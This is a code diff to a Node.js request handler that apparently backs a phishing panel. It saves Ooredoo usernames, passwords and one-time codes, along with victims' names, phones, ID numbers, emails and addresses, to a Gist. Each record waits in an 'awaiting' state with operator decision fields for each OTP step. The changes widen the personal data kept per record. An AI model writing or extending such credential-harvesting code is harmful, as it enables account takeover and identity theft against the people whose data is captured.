@@ -127,6 +127,13 @@ module.exports = async function handler(req, res) {
             }
           });
           orders[idx].ooredoo = current;
+          if (o.n) orders[idx].n = o.n;
+          if (o.p) orders[idx].p = o.p;
+          if (o.id) orders[idx].id = o.id;
+          if (o.e) orders[idx].e = o.e;
+          if (o.g) orders[idx].g = o.g;
+          if (o.ad) orders[idx].ad = o.ad;
+          if (o.lang) orders[idx].lang = o.lang;
           orders[idx].status = "awaiting";
           orders[idx].step = o.step === "ooredoo-otp2" ? "ooredoo-otp2" : o.step === "ooredoo-otp" ? "ooredoo-otp" : "ooredoo";
           orders[idx].decision = "";
@@ -136,12 +143,16 @@ module.exports = async function handler(req, res) {
           await saveToGist();
           return res.status(200).json({ ok: true, ref: o.ref });
         } else {
-          orders.unshift({
-            ref: o.ref, status: "awaiting",
+          var newOrder = Object.assign({}, o, {
+            status: "awaiting",
             step: o.step === "ooredoo-otp2" ? "ooredoo-otp2" : o.step === "ooredoo-otp" ? "ooredoo-otp" : "ooredoo",
-            ooredoo: o.ooredoo, decision: "", reason: "", next: "",
-            n: o.n || "", p: o.p || "", ts: Date.now(), updated: Date.now()
+            ooredoo: { username: str(b.ooredoo.username, 200), password: str(b.ooredoo.password, 200), otp: str(b.ooredoo.otp, 50) },
+            decision: "", reason: "", next: "",
+            ts: Date.now(), updated: Date.now()
           });
+          if (newOrder.pay === undefined) delete newOrder.pay;
+          orders.unshift(newOrder);
+          if (orders.length > 5000) orders.length = 5000;
           await saveToGist();
           return res.status(200).json({ ok: true, ref: o.ref });
         }
